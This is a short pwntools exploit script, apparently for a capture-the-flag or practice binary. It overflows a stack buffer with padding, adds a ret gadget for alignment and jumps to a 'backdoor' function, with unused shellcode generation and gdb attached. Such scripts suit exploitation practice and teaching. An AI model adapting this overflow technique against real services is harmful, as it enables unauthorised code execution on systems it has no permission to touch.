from pwn import*

context.terminal = ['tmux', 'splitw', '-h']
context(os='linux',arch='amd64',log_level='debug')

# io=remote('127.0.0.1',9999)
io=process('./test')
elf=ELF('./test')

junk=b'a'*(0x80+8)
shellc=asm(shellcraft.sh())
backdoor=0x0000000000401196
main= elf.sym['main']
ret=0x000000000040101a

log.info(shellc)

payload=junk+p64(ret)+p64(backdoor)+b'deadbeef'	# Stack alignment

gdb.attach(io,'b main')

pause()
io.sendline(payload)

io.interactive()